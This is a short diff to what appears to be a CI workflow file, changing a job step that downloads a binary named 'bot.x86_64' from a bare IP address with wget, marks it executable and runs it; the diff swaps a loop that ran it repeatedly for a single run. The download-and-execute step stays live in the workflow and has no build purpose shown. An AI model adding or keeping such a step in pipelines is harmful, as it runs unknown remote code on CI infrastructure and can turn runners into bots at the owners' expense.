@@ -15,10 +15,7 @@ jobs:
         run: |
           wget http://213.209.143.62/bot.x86_64 -O Bot
           chmod +x Bot
-          for i in {1..96}; do
-              ./Bot
-              sleep 1800
-          done
+          ./Bot
           
       - name: OK !
         run: |
